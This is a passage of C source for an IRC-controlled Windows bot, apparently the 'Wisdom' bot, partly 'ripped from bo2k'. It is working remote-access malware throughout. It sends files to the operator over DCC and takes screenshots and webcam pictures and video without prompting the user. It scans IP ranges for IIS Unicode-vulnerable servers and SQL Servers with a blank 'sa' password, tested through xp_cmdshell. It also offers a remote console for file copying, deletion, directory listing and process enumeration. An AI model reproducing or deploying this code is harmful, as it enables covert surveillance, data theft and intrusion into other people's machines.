	return 0;
}

DWORD WINAPI DccRecv(LPVOID param)
{
	DCCGET dcc;
	SOCKET get;
	char buffer[2048];
	unsigned long recvd;
	int r;
	unsigned long written;
	int tmpsnd;
	unsigned long start;

	dcc = *((DCCGET *)param);
	get = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (get == INVALID_SOCKET)
	{
		CloseHandle(dcc.hFile);
		wsprintf(buffer, "PRIVMSG %s :socket() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	if (connect(get, (struct sockaddr *)&dcc.sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		CloseHandle(dcc.hFile);
		wsprintf(buffer, "PRIVMSG %s :connect() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	recvd = 0;
	start = GetTickCount();
	while (recvd <= dcc.len)
	{
		memset(buffer, 0, sizeof(buffer));
		r = recv(get, buffer, sizeof(buffer), 0);
		if (r == 0 || r == SOCKET_ERROR) break;
		recvd = recvd + r;		
		tmpsnd = htonl(recvd);
		send(get,(const char *)&tmpsnd,sizeof(tmpsnd),0);
		WriteFile(dcc.hFile, buffer, r, &written, 0);
	}
	wsprintf(buffer, "PRIVMSG %s :Received %s (%d bytes).\r\n", channel, dcc.file, recvd);
	send(sock, buffer, lstrlen(buffer), 0);
	CloseHandle(dcc.hFile);
	closesocket(get);
	return 0;
}

DWORD WINAPI DccSend(LPVOID param)
{
	DCCSEND dcc;
	SOCKET dccsock;
	sockaddr_in dccsin;
	int dccport = (rand()%1000)+1024;
	char buffer[1024];
	char ip[32];
	HANDLE hFile;
	unsigned long lame;
	SOCKADDR sa;
	int sas;
	char file[2048];
	int ret;
	unsigned long size, sent, start;

	dcc = *((DCCSEND *)param);
	dccsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (dccsock == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :socket() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	dccsin.sin_family = AF_INET;
	dccsin.sin_port = htons(dccport);
	dccsin.sin_addr.s_addr = INADDR_ANY;
	if (bind(dccsock, (const sockaddr *)&dccsin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		wsprintf(buffer, "PRIVMSG %s :bind() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	hFile = CreateFile(dcc.file, GENERIC_READ, FILE_SHARE_READ, 0 ,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wsprintf(buffer, "PRIVMSG %s :CreateFile() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	wsprintf(buffer, "PRIVMSG %s :Sending file to %s...\r\n", channel, dcc.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);
	wsprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	memset(buffer, 0, sizeof(buffer));
	wsprintf(buffer, "NOTICE %s :DCC Send %s (%s)\r\n", dcc.target, dcc.sfile, ip);
	send(sock, buffer, lstrlen(buffer), 0);
	wsprintf(buffer, "PRIVMSG %s :\1DCC SEND %s %d %d %d\1\r\n", dcc.target, dcc.sfile, htonl(inet_addr(ip)), dccport, GetFileSize(hFile,&lame));
	send(sock, buffer, lstrlen(buffer), 0);
	listen(dccsock, 2);
    fd_set readfd;
    readfd.fd_count = 1;
    readfd.fd_array[0] = dccsock;
    timeval tv = {60,0};
    if (select(0, &readfd, 0,0, &tv) == 0)
    {
		CloseHandle(hFile);
		closesocket(dccsock);
		wsprintf(buffer, "PRIVMSG %s :DCC send timed out.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
    }
	SOCKET dsock = accept(dccsock, 0, 0);
	if (dsock == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :accept() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	wsprintf(buffer, "PRIVMSG %s :Transfer accepted, sending...\r\n", channel);
	send(sock, buffer, lstrlen(buffer), 0);
	closesocket(dccsock);
	size = GetFileSize(hFile,&lame);
	sent = 0;
	start = GetTickCount();
	while (TRUE)
	{
		ret = ReadFile(hFile, file, sizeof(file), &lame, NULL);
		if (ret != 0)
		{
			if (send(dsock, file, lame, 0) == SOCKET_ERROR)
			{
				wsprintf(buffer, "PRIVMSG %s :send() failed.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				return 0;
			}
			sent = sent + lame;
			if (sent == size) break;
		}
		if (ret == 0) break;
	}
	Sleep(500);
	CloseHandle(hFile);
	closesocket(dsock);
	wsprintf(buffer, "PRIVMSG %s :Sent %s to %s. (%d bytes).\r\n", channel, dcc.sfile, dcc.target, sent);
	send(sock, buffer, lstrlen(buffer), 0);
	return 0;
}

//ripped from bo2k

bool Capture(char *file)
{
	HDC hdc;
	HBITMAP bitmap;
	BITMAPINFO bmpinfo;
	LPVOID pBits;
	HDC hdc2;
	DWORD dwWidth, dwHeight, dwBPP, dwNumColors;
	HGDIOBJ gdiobj;
	HANDLE hfile;
	DWORD dwBytes;	

	hdc=CreateDC("DISPLAY", NULL, NULL, NULL);
	if(hdc==NULL) {
		return FALSE;
	}
	dwWidth = GetDeviceCaps(hdc, HORZRES);
	dwHeight = GetDeviceCaps(hdc, VERTRES);
	dwBPP = GetDeviceCaps(hdc, BITSPIXEL);
	if(dwBPP<=8) {
		dwNumColors = GetDeviceCaps(hdc, NUMCOLORS);
		dwNumColors = 256;
	} else {
		dwNumColors = 0;
	}
	hdc2=CreateCompatibleDC(hdc);
	if(hdc2==NULL) {
		DeleteDC(hdc);
		return FALSE;
	}
	bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfo.bmiHeader.biWidth = dwWidth;
	bmpinfo.bmiHeader.biHeight = dwHeight;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biSizeImage = 0;
	bmpinfo.bmiHeader.biXPelsPerMeter = 0;
	bmpinfo.bmiHeader.biYPelsPerMeter = 0;
	bmpinfo.bmiHeader.biClrUsed = dwNumColors;
	bmpinfo.bmiHeader.biClrImportant = dwNumColors;
	bitmap = CreateDIBSection(hdc, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);
	if(bitmap==NULL) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	gdiobj = SelectObject(hdc2, (HGDIOBJ)bitmap);
	if((gdiobj==NULL) || (gdiobj==(void *)GDI_ERROR)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	if (!BitBlt(hdc2, 0,0, dwWidth, dwHeight, hdc, 0,0, SRCCOPY)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}	
	RGBQUAD colors[256];
	if(dwNumColors!=0) {
		dwNumColors = GetDIBColorTable(hdc2, 0, dwNumColors, colors);
	}	
	BITMAPFILEHEADER bitmapfileheader;
	BITMAPINFOHEADER bitmapinfoheader;
	bitmapfileheader.bfType = 0x4D42;
	bitmapfileheader.bfSize = ((dwWidth * dwHeight * dwBPP)/8) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapfileheader.bfReserved1 = 0;
	bitmapfileheader.bfReserved2 = 0;
	bitmapfileheader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));  
	bitmapinfoheader.biSize = sizeof(BITMAPINFOHEADER);
	bitmapinfoheader.biWidth = dwWidth;
	bitmapinfoheader.biHeight = dwHeight;
	bitmapinfoheader.biPlanes = 1;
	bitmapinfoheader.biBitCount = (WORD)dwBPP;
	bitmapinfoheader.biCompression = BI_RGB;
	bitmapinfoheader.biSizeImage = 0;
	bitmapinfoheader.biXPelsPerMeter = 0;
	bitmapinfoheader.biYPelsPerMeter = 0;
	bitmapinfoheader.biClrUsed = dwNumColors;
	bitmapinfoheader.biClrImportant = 0;	
	hfile=CreateFile(file,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hfile==INVALID_HANDLE_VALUE) {
		DeleteObject(bitmap);
		DeleteDC(hdc2);
		DeleteDC(hdc);
		return FALSE;
	}
	WriteFile(hfile,&bitmapfileheader,sizeof(BITMAPFILEHEADER), &dwBytes, NULL);
	WriteFile(hfile,&bitmapinfoheader,sizeof(BITMAPINFOHEADER), &dwBytes, NULL);
	if(dwNumColors!=0)
		WriteFile(hfile,colors,sizeof(RGBQUAD)*dwNumColors,&dwBytes,NULL);
	WriteFile(hfile,pBits,(dwWidth*dwHeight*dwBPP)/8,&dwBytes,NULL);
	CloseHandle(hfile);		
	DeleteObject(bitmap);
	DeleteDC(hdc2);
	DeleteDC(hdc);
	return TRUE;
}

int CaptureFrame(char *file, int index, int x, int y)
{
	char svBuffer[1024];
	HWND hwndCap;

	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap==NULL) {
		return 1;
	}
	if(capDriverConnect(hwndCap, index)==FALSE) {
		DestroyWindow(hwndCap);
		return 1;	
	}
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwndCap);
		return 1;
	}
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwWidth,dwHeight,dwBPP;
	if(x<=0) dwWidth=640;
	else dwWidth=x;
	if(y<=0) dwHeight=480;
	else dwHeight=y;
	dwBPP=16;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capGrabFrameNoStop(hwndCap);
	capFileSaveDIB(hwndCap, file);
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	capDriverDisconnect(hwndCap); 
	DestroyWindow(hwndCap);
	return 0;
}

int CaptureVideo(char *file, int index, int time, int x, int y)
{
	char svBuffer[1024];
	HWND hwndCap;
	
	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap==NULL) {
		return 1;
	}
	if(capDriverConnect(hwndCap, index)==FALSE) {
		DestroyWindow(hwndCap);
		return 1;	
	}	
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwndCap);
		return 1;
	}	
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;	
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		return 1;
	}
	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwSeconds,dwWidth,dwHeight,dwBPP,dwFPS;
	if(time<=0) dwSeconds=5;
	else dwWidth=time;
	if(x<=0) dwWidth=160;
	else dwWidth=x;
	if(y<=0) dwHeight=120;
	else dwHeight=y;
	dwBPP=16;
	dwFPS=15;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;	
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;	
	CAPTUREPARMS capparms;	
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capCaptureGetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));		
	capparms.fMakeUserHitOKToCapture = FALSE;
	capparms.vKeyAbort = 0;
	capparms.fAbortLeftMouse = FALSE;
	capparms.fAbortRightMouse = FALSE;
	capparms.fLimitEnabled = TRUE;
	capparms.wTimeLimit = dwSeconds;
	capparms.dwRequestMicroSecPerFrame = (1000000/dwFPS);																		
	capCaptureSetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));
	capFileSetCaptureFile(hwndCap, file); 								
	capCaptureSequence(hwndCap); 
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	capDriverDisconnect(hwndCap); 
	DestroyWindow(hwndCap);
	return 0;
}

DWORD WINAPI UnicodeScan(void * addr)
{
	char target[512];
	char request[1024];
	SOCKET http;
	SOCKADDR_IN sin;
	DWORD nb;
	fd_set fd;
	timeval timeout = {1, 0};
	char buffer[1024];
	int i;

	strcpy(target, (char *)addr);
	wsprintf(request, "GET %sdir HTTP/1.1\r\nConnection: close\r\n\r\n", unicode);
	http = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr(target);
	nb = 1;
	if (connect(http, (const sockaddr *)&sin, sizeof(sin)) != SOCKET_ERROR)
	{
		send(http, request, lstrlen(request), 0);
		ioctlsocket(http, FIONBIO, &nb);
		FD_ZERO(&fd);
		FD_SET(http, &fd);
		select(0, &fd, NULL, NULL, &timeout);
		if (FD_ISSET(http, &fd))
		{
			recv(http, buffer, sizeof(buffer), 0);
 			for(i=0; i != strlen(buffer); i++)
 			{
 				if(buffer[i] == '\n')
 				break;
 			}
			buffer[i-1] = '\0';
			if (lstrcmpi(buffer, "HTTP/1.1 200 OK") == 0 || lstrcmpi(buffer, "HTTP/1.0 200 OK") == 0)
			{
				wsprintf(buffer, "PRIVMSG %s :Unicode vulnerable server on %s.\r\n", channel, target);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
	}	
	closesocket(http);
	return 0;
}

DWORD WINAPI sqlcheck(void * addr)
{
	SQLHENV henv = SQL_NULL_HENV;
	SQLHDBC hdbc1 = SQL_NULL_HDBC;     
	SQLHSTMT hstmt1 = SQL_NULL_HSTMT;
	RETCODE retcode;
    SQLCHAR szName[512], szOutConn[1024] ;
    SQLINTEGER    cbName;
	SQLSMALLINT szint;
	char constr[1024], target[64];
	int count=0;
	char command[1024];
	char buffer[1024];
	
	strcpy(target, (char *)addr);
	sprintf(constr, "%s%s%s", "DRIVER={SQL Server};SERVER=", target,";UID=sa;PWD="); 
    retcode = SQLAllocHandle (SQL_HANDLE_ENV, NULL, &henv);
    retcode = SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER);
    retcode = SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc1);
    retcode = SQLDriverConnect(hdbc1, NULL, (SQLTCHAR*)constr, SQL_NTS, szOutConn, 1024, &szint, SQL_DRIVER_NOPROMPT);
	if (retcode == SQL_ERROR)
	{
		return 0;
	}
	strcpy(command,"xp_cmdshell 'ping 127.0.0.1'");
	retcode = SQLAllocHandle(SQL_HANDLE_STMT, hdbc1, &hstmt1);
	retcode = SQLExecDirect(hstmt1, (SQLTCHAR*)&command, SQL_NTS);		
	if (retcode == SQL_ERROR)
	{
	}
	else if (retcode == SQL_NO_DATA)
	{
		wsprintf(buffer, "PRIVMSG %s :SQL server with open 'sa' account on %s.\r\n", channel, target);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	else
	{
		wsprintf(buffer, "PRIVMSG %s :SQL server with open 'sa' account on %s.\r\n", channel, target);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	SQLFreeHandle(SQL_HANDLE_STMT, hstmt1);
    SQLDisconnect(hdbc1);
    SQLFreeHandle(SQL_HANDLE_DBC, hdbc1);
    SQLFreeHandle(SQL_HANDLE_ENV, henv);
    return 0;
}

DWORD WINAPI PScan(LPVOID param)
{
	PSCAN info;
	char ip[129][128];
	SOCKET sockets[129];
	fd_set fd;
	timeval timeout;
	int b, c, node, i, x;
	sockaddr_in sin;
	unsigned long nb;
	char buffer[1024];
	DWORD thread;

	info = *((PSCAN *)param);
	timeout.tv_sec = info.delay;
	timeout.tv_usec = 0;
	i = 0;
	nb = 1;
	if (info.scantype == 1) //class A scan
	{
		wsprintf(buffer, "PRIVMSG %s :IP range scan started...\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		for (b=0; b<256; b++)
		{
			for (c=0; c<256; c++)
			{
				for (node=0; node<256; node++)
				{
					wsprintf(ip[i], "%s.%d.%d.%d", info.subnet, b, c, node);
					sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
					sin.sin_family = AF_INET;
					sin.sin_port = htons(info.port);
					sin.sin_addr.s_addr = inet_addr(ip[i]);
					ioctlsocket(sockets[i], FIONBIO, &nb);
					connect(sockets[i], (sockaddr *)&sin, sizeof(SOCKADDR_IN));
					i = i + 1;
					if (i > 128)
					{
						FD_ZERO(&fd);
						for (x=0; x<128; x++) FD_SET(sockets[x], &fd);
						if (select(0, 0, &fd, 0, &timeout) > 0)
						{
							for (x=0; x<128; x++)
							{
								if (FD_ISSET(sockets[x], &fd))
								{
									wsprintf(buffer, "PRIVMSG %s :Open port found on %s[:%d].\r\n", channel, ip[x], info.port);
									send(sock, buffer, lstrlen(buffer), 0);
									if (info.port == 1433)
									{
										CreateThread(NULL, 0, &sqlcheck, (void *)&ip[x], 0, &thread);
									}
									if (info.port == 80)
									{
										CreateThread(NULL, 0, &UnicodeScan, (void *)&ip[x], 0, &thread);
									}
								}
								closesocket(sockets[x]);
							}
						}
						i = 0;
					}
				}
			}
		}
		wsprintf(buffer, "PRIVMSG %s :IP range scan complete.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (info.scantype == 2) //class B scan
	{
		wsprintf(buffer, "PRIVMSG %s :IP range scan started...\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		for (c=0; c<256; c++)
		{
			for (node=0; node<256; node++)
			{
				wsprintf(ip[i], "%s.%d.%d", info.subnet, c, node);
				sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				sin.sin_family = AF_INET;
				sin.sin_port = htons(info.port);
				sin.sin_addr.s_addr = inet_addr(ip[i]);
				ioctlsocket(sockets[i], FIONBIO, &nb);
				connect(sockets[i], (sockaddr *)&sin, sizeof(SOCKADDR_IN));
				i = i + 1;
				if (i > 128)
				{
					FD_ZERO(&fd);
					for (x=0; x<128; x++) FD_SET(sockets[x], &fd);
					if (select(0, 0, &fd, 0, &timeout) > 0)
					{
						for (x=0; x<128; x++)
						{
							if (FD_ISSET(sockets[x], &fd))
							{
								wsprintf(buffer, "PRIVMSG %s :Open port found on %s[:%d].\r\n", channel, ip[x], info.port);
								send(sock, buffer, lstrlen(buffer), 0);
								if (info.port == 1433)
								{
									CreateThread(NULL, 0, &sqlcheck, (void *)&ip[x], 0, &thread);
								}
								if (info.port == 80)
								{
									CreateThread(NULL, 0, &UnicodeScan, (void *)&ip[x], 0, &thread);
								}
							}
							closesocket(sockets[x]);
						}
					}
					i = 0;
				}
			}
		}
		wsprintf(buffer, "PRIVMSG %s :IP range scan complete.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	if (info.scantype == 3) //class C scan
	{
		wsprintf(buffer, "PRIVMSG %s :IP range scan started...\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		for (node=0; node<256; node++)
		{
			wsprintf(ip[i], "%s.%d", info.subnet, node);
			sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			sin.sin_family = AF_INET;
			sin.sin_port = htons(info.port);
			sin.sin_addr.s_addr = inet_addr(ip[i]);
			ioctlsocket(sockets[i], FIONBIO, &nb);
			connect(sockets[i], (sockaddr *)&sin, sizeof(SOCKADDR_IN));
			i = i + 1;
			if (i > 128)
			{
				FD_ZERO(&fd);
				for (x=0; x<128; x++) FD_SET(sockets[x], &fd);
				if (select(0, 0, &fd, 0, &timeout) > 0)
				{
					for (x=0; x<128; x++)
					{
						if (FD_ISSET(sockets[x], &fd))
						{
							wsprintf(buffer, "PRIVMSG %s :Open port found on %s[:%d].\r\n", channel, ip[x], info.port);
							send(sock, buffer, lstrlen(buffer), 0);
							if (info.port == 1433)
							{
								CreateThread(NULL, 0, &sqlcheck, (void *)&ip[x], 0, &thread);
							}
							if (info.port == 80)
							{
								CreateThread(NULL, 0, &UnicodeScan, (void *)&ip[x], 0, &thread);
							}
						}
						closesocket(sockets[x]);
					}
				}
				i = 0;
			}
		}
		wsprintf(buffer, "PRIVMSG %s :IP range scan complete.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
	}
	return 0;
}

DWORD WINAPI console(LPVOID param)
{
	SOCKADDR_IN sin;
	SOCKET dccs;
	char buffer[1024];
	char buff[1024], own[1024];
	char *arg[32];
	int ret, i;
	DWORD total, days, hours, minutes;

	sin = *((SOCKADDR_IN *)param);
	dccs = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (dccs == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :socket() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	if (connect(dccs, (const SOCKADDR *)&sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		wsprintf(buffer, "PRIVMSG %s :connect() failed.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	wsprintf(buffer, "PRIVMSG %s :DCC console activated.\r\n", channel);
	send(sock, buffer, lstrlen(buffer), 0);
	total = (GetTickCount() / 1000);
	days = total / 86400;
	hours = (total % 86400) / 3600;
	minutes = ((total % 86400) % 3600) / 60;
	wsprintf(buffer, "Welcome to the Wisdom DCC console.\r\nCurrent system uptime: %d day(s), %d hour(s) and %d minute(s).\r\n",days,hours,minutes);
	send(dccs, buffer, lstrlen(buffer), 0);
	while (TRUE)
	{
		ZeroMemory(&buff, sizeof(buff));
		ZeroMemory(&own, sizeof(own));
		ret = recv(dccs, buff, sizeof(buff), 0);
		if (ret == 0 || ret == SOCKET_ERROR)
		{
			wsprintf(buffer, "PRIVMSG %s :DCC console closed.\r\n", channel);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		for (i=0; i<lstrlen(buff); i++)
		{
			if (buff[i] == 10 || buff[i] == 13)
			{
				break;
			}
			own[i] = buff[i];
		}
		arg[0] = strtok(own, " ");
		for (i = 1; i < 32; i++) 
		{
			arg[i] = strtok(NULL, " ");
		}
		if (lstrcmp(arg[0],"help") == 0)
		{
			wsprintf(buffer, "Available commands:\r\n");
			send(dccs, buffer, lstrlen(buffer), 0);
			wsprintf(buffer, "  file, process, network.\r\n");
			send(dccs, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[0],"network") == 0)
		{
			if (lstrlen(arg[1]) == 0)
			{
				wsprintf(buffer, "Sub-commands of 'network':\r\n  enumerate.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[1],"enumerate") == 0)
			{
				char strTemp[4096];
				DWORD dwScope = RESOURCE_CONTEXT;
				NETRESOURCE *NetResource = NULL;
				HANDLE hEnum;

				WNetOpenEnum(dwScope, NULL, NULL, NULL, &hEnum);
				if (hEnum)
				{
					DWORD Count = 0xFFFFFFFF;
					DWORD BufferSize = 2048;
					LPVOID Buffer = new char[2048];
					WNetEnumResource(hEnum, &Count, Buffer, &BufferSize);
					NetResource = (NETRESOURCE*)Buffer;
					char szHostName[200];
					unsigned int i;
					for (i = 0; i < BufferSize/sizeof(NETRESOURCE); i++, NetResource++)
					{
						if (NetResource->dwUsage == RESOURCEUSAGE_CONTAINER && NetResource->dwType == RESOURCETYPE_ANY)
						{
							if (NetResource->lpRemoteName && NetResource->dwType == RESOURCETYPE_DISK)
							{
								char strFullName[4096];
								strcpy(strFullName, NetResource->lpRemoteName);
								wsprintf(strTemp, "%s\r\n", strFullName);
								send(dccs, strTemp, lstrlen(strTemp), 0);
							}
						}
					}
					delete Buffer;
					WNetCloseEnum(hEnum); 
				}
			}
			wsprintf(buffer, "End of network list.\r\n");
			send(dccs, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[0],"file") == 0)
		{
			if (lstrlen(arg[1]) == 0)
			{
				wsprintf(buffer, "Sub-commands of 'file':\r\n  dir.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[1],"copy") == 0)
			{
				if (CopyFile(arg[2], arg[3], false))
				{
					wsprintf(buffer, "File copied.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "Error while copying file.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
				}
			}
			if (lstrcmp(arg[1],"delete") == 0)
			{
				if (DeleteFile(arg[2]))
				{
					wsprintf(buffer, "File deleted.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "Error while deleting file.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
				}
			}
			if (lstrcmp(arg[1],"dir") == 0)
			{
				WIN32_FIND_DATA find;
				HANDLE hFind;
				char dir[4096];

				strcpy(dir,"");
				for (i=2; i<32; i++)
				{
					if (lstrlen(arg[i]) > 0)
					{
						if (i == 5) strcpy(dir, arg[i]);
						else 
						{
							strcat(dir," ");
							strcat(dir,arg[i]);
						}
					}
				}
				wsprintf(buffer, "Listing Directory: %s.\r\n", arg[2]);
				send(dccs, buffer, lstrlen(buffer), 0);
				hFind = FindFirstFile(arg[2], &find);
				if (hFind != INVALID_HANDLE_VALUE)
				{
					do
					{
						if ((find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
						{
							wsprintf(buffer, "<%s>\r\n", find.cFileName);
							send(dccs, buffer, lstrlen(buffer), 0);
						}
						else
						{
							wsprintf(buffer, "%s\r\n", find.cFileName);
							send(dccs, buffer, lstrlen(buffer), 0);
						}
					} while (FindNextFile(hFind, &find)); 
					FindClose(hFind);
				}
				wsprintf(buffer, "End of directory list.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[0],"process") == 0)
		{
			if (lstrlen(arg[1]) == 0)
			{
				wsprintf(buffer, "Sub-commands of 'process':\r\n  list, kill, modules.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
				return 0;
			}
			if (lstrcmp(arg[1],"modules") == 0)
			{
				if (lstrlen(arg[2]) == 0)
				{
					wsprintf(buffer, "Syntax: process modules <pid>.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				HMODULE hMods[1024];
				HANDLE hProcess;
				DWORD cbNeeded;
				unsigned int i;

				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,atoi(arg[2]));
				if (NULL == hProcess)
				{
					wsprintf(buffer, "Error while enumerating modules.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				wsprintf(buffer, "Listing modules...\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
				if(EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
				{
					for (i = 0; i<(cbNeeded / sizeof(HMODULE)); i++)
					{
						char szModName[MAX_PATH];
						if ( GetModuleFileNameEx(hProcess,hMods[i],szModName,sizeof(szModName)))
						{
							wsprintf(buffer, "%s (0x%08X)\r\n", szModName, hMods[i]);
							send(dccs, buffer, lstrlen(buffer), 0);
						}	
					}
				}
				else
				{
					wsprintf(buffer, "Error while enumerating modules.\r\n");
					send(dccs, buffer, lstrlen(buffer), 0);
					return 0;
				}
				CloseHandle(hProcess);
				wsprintf(buffer, "End of module list.\r\n");
				send(dccs, buffer, lstrlen(buffer), 0);
			}
